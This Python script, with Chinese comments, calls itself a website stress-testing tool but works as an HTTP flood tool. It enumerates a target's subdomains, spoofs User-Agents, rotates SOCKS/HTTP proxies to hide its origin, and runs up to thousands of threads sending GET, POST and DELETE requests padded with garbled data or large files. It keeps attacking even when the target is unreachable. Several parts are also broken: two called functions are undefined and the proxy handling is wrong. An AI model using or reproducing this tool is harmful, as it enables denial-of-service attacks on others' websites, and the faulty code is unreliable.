import argparse
import requests
import socks
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time
import random
import threading
import numpy as np
import matplotlib.pyplot as plt
from datetime import datetime
import psutil
import logging
from tqdm import tqdm
import sublist3r
import string
import signal
import sys
import os

# 初始化日志记录
logging.basicConfig(filename='request_logs.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# 捕捉 Ctrl+C 中断信号，确保安全退出
def signal_handler(sig, frame):
    global threads_running
    print('程序中断，正在安全退出...')
    threads_running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# 读取UA列表
def load_user_agents(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f]

# 生成随机乱码文本
def generate_garbled_text(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

# 使用 Sublist3r 获取子域名
def get_subdomains(domain):
    subdomains = sublist3r.main(domain, 40, savefile=None, ports=None, silent=True, verbose=False, enable_bruteforce=False, engines=None)
    return subdomains

# 获取所有链接
def get_all_urls(base_url):
    urls = set()
    try:
        response = requests.get(base_url, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            urls.add(full_url)
    except Exception as e:
        logging.error(f"Error fetching URLs from {base_url}: {e}")
    return urls

# 动态管理线程数
def dynamic_thread_management():
    cpu_usage = psutil.cpu_percent(interval=1)
    if cpu_usage > 80:
        return max(10, thread_count // 2)
    elif cpu_usage < 50:
        return min(2500, thread_count * 2)
    return thread_count

# 记录请求的详细信息
def log_request_details(result):
    logging.info(f"URL: {result['url']}, Method: {result['method']}, Status: {result['status_code']}, "
                 f"Response Time: {result['response_time']:.2f}s, Data Size: {result['data_size']} bytes")

# 显示当前网络流量
def net_speed():
    sent_before = psutil.net_io_counters().bytes_sent
    recv_before = psutil.net_io_counters().bytes_recv
    time.sleep(1)
    sent_now = psutil.net_io_counters().bytes_sent
    recv_now = psutil.net_io_counters().bytes_recv
    sent = (sent_now - sent_before) / 1024
    recv = (recv_now - recv_before) / 1024
    return sent, recv

# 使用 tqdm 显示测试进度和 Dashboard 信息，添加了发送速率显示
def update_progress(start_time, test_duration):
    global active_threads, requests_last_second, bytes_sent
    with tqdm(total=test_duration, bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{rate_fmt}]') as pbar:
        while threads_running:
            elapsed_time = time.time() - start_time
            progress = elapsed_time / test_duration
            pbar.n = int(progress * test_duration)
            rate = bytes_sent / (elapsed_time * 1024 * 1024)  # 计算发送速率 (MB/s)
            pbar.set_postfix({
                'Active Threads': active_threads,
                'Requests/s': requests_last_second,
                'Upload': f"{rate:.2f}MB/s" if rate > 1 else f"{rate*1024:.2f}KB/s",
                'Total Requests': len(results)
            })
            pbar.update(0)
            time.sleep(1)
            requests_last_second = 0  # Reset after each second

# 检查域名是否可访问
def check_domain_accessibility(domain, max_retries):
    success = False
    for attempt in range(max_retries):
        try:
            response = requests.get(f"https://{domain}", timeout=5)
            if response.status_code == 200:
                print(f"域名 {domain} 可访问")
                success = True
                break
        except requests.exceptions.ConnectionError as e:
            print(f"尝试访问域名 {domain} 失败: {e}")
            if attempt < max_retries - 1:
                print(f"重试中... ({attempt + 1}/{max_retries})")
            else:
                print(f"最大重试次数已到达，域名 {domain} 不可访问")
        time.sleep(1)
    return success

# 加载代理列表
def load_proxies(proxy_file):
    proxies = []
    with open(proxy_file, 'r') as f:
        proxies = [line.strip() for line in f.readlines()]
    return proxies

# 检查代理是否可用
def check_proxy(proxy, proxy_type):
    try:
        s = socks.socksocket()
        if proxy_type == 'SOCKS4':
            s.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
        elif proxy_type == 'SOCKS5':
            s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
        elif proxy_type == 'HTTP':
            s.set_proxy(socks.HTTP, proxy[0], int(proxy[1]))
        s.connect(('1.1.1.1', 80))  # 测试代理的可用性
        return True
    except Exception:
        return False

# 验证并过滤有效代理
def validate_proxies(proxies, proxy_type):
    valid_proxies = []
    for proxy in proxies:
        proxy = proxy.split(":")
        if check_proxy(proxy, proxy_type):
            valid_proxies.append(proxy)
    return valid_proxies

# 执行请求，通过代理发送
def perform_requests(urls, headers_list, request_interval, methods, garbled_text_len, files_in_memory, proxies, proxy_type):
    global active_threads, requests_last_second, bytes_sent
    with lock:
        active_threads += 1
    try:
        while threads_running:
            url = random.choice(urls)
            headers = random.choice(headers_list)
            start_time = datetime.now()
            
            # 选择请求方法
            method = random.choice(methods)
            
            # 数据内容：乱码或者文件
            data = None
            if garbled_text_len:
                data = generate_garbled_text(garbled_text_len)
            elif files_in_memory:
                data = random.choice(files_in_memory)
            
            # 设置代理
            proxy = random.choice(proxies) if proxies else None
            if proxy:
                s = socks.socksocket()
                if proxy_type == 'SOCKS4':
                    s.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
                elif proxy_type == 'SOCKS5':
                    s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
                elif proxy_type == 'HTTP':
                    s.set_proxy(socks.HTTP, proxy[0], int(proxy[1]))
                s.connect((url, 80))

            # 发送请求
            try:
                if method == 'GET':
                    response = requests.get(url, headers=headers, proxies=proxy, verify=False)
                elif method == 'POST':
                    response = requests.post(url, headers=headers, data=data, proxies=proxy, verify=False)
                elif method == 'DELETE':
                    response = requests.delete(url, headers=headers, data=data, proxies=proxy, verify=False)
            except requests.exceptions.RequestException as e:
                logging.error(f"请求错误: {e}")
                continue

            # 请求完成，记录时间和数据大小
            if response:
                end_time = datetime.now()
                elapsed_time = (end_time - start_time).total_seconds()
                data_size = len(response.content)
                    
                with lock:
                    result = {
                        "timestamp": start_time,
                        "url": url,
                        "method": method,
                        "response_time": elapsed_time,
                        "status_code": response.status_code,
                        "data_size": data_size
                    }
                    results.append(result)
                    requests_last_second += 1
                    bytes_sent += data_size
                    log_request_details(result)

            time.sleep(request_interval)
    finally:
        with lock:
            active_threads -= 1

# 主程序逻辑
def main():
    parser = argparse.ArgumentParser(description='Website Stress Testing Tool')
    parser.add_argument('--domain', type=str, required=True, help='The domain to test.')
    parser.add_argument('--duration', type=int, default=2400, help='Test duration in seconds.')
    parser.add_argument('--threads', type=int, default=1000, help='Number of threads.')
    parser.add_argument('--interval', type=float, default=0.1, help='Request interval in seconds.')
    parser.add_argument('--ua-file', type=str, default='user_agents.txt', help='Path to User-Agent list file.')
    parser.add_argument('--tolerance', type=int, default=5, help='Maximum retries for domain check.')
    parser.add_argument('--skip-check', action='store_true', help='Skip domain accessibility check.')
    parser.add_argument('--methods', nargs='+', default=['GET'], help='HTTP methods to use (GET, POST, DELETE).')
    parser.add_argument('--garbled-text-len', type=int, help='Length of random garbled text to send in requests.')
    parser.add_argument('--file', type=str, help='Path to a file or folder for sending large files.')
    parser.add_argument('--proxy-file', type=str, help='Path to proxy list file.')
    parser.add_argument('--proxy-type', type=str, default='SOCKS5', choices=['SOCKS4', 'SOCKS5', 'HTTP'], help='Type of proxies to use.')

    args = parser.parse_args()

    global threads_running, active_threads, requests_last_second, results, bytes_sent
    global thread_count, test_duration, request_interval, lock

    # 检查域名是否可访问（若未跳过）
    if not args.skip_check:
        domain_accessible = check_domain_accessibility(args.domain, args.tolerance)
        if not domain_accessible:
            print(f"Warning: 域名 {args.domain} 访问失败，将继续进行压力测试。")

    # 加载 User-Agent 列表
    headers_list = [{"User-Agent": ua} for ua in load_user_agents(args.ua_file)]

    # 获取子域名和 URL
    subdomains = get_subdomains(args.domain)
    all_urls = {"https://" + args.domain} | {"https://" + sub for sub in subdomains}

    print(f"Valid URLs found: {len(all_urls)}")
    urls = list(all_urls)

    # 读取大文件到内存中
    files_in_memory = []
    if args.file:
        files_in_memory = load_files_to_memory(args.file)
        print(f"Loaded {len(files_in_memory)} files into memory.")

    # 加载代理列表并验证
    proxies = []
    if args.proxy_file:
        proxies = load_proxies(args.proxy_file)
        print(f"Loaded {len(proxies)} proxies from file.")
        proxies = validate_proxies(proxies, args.proxy_type)
        print(f"{len(proxies)} proxies validated and usable.")

    # 共享资源初始化
    threads_running = True
    lock = threading.Lock()
    results = []
    requests_last_second = 0
    active_threads = 0
    bytes_sent = 0

    start_time = time.time()

    # 启动进度条和 Dashboard 线程
    progress_thread = threading.Thread(target=update_progress, args=(start_time, args.duration))
    progress_thread.start()

    # 启动压力测试线程
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=perform_requests, args=(urls, headers_list, args.interval, args.methods, args.garbled_text_len, files_in_memory, proxies, args.proxy_type))
        t.start()
        threads.append(t)

    # 等待测试完成
    time.sleep(args.duration)
    threads_running = False

    # 等待所有线程结束
    for t in threads:
        t.join()

    # 分析并可视化结果
    analyze_results(urls)

    # 停止进度条线程
    progress_thread.join()

if __name__ == '__main__':
    main()
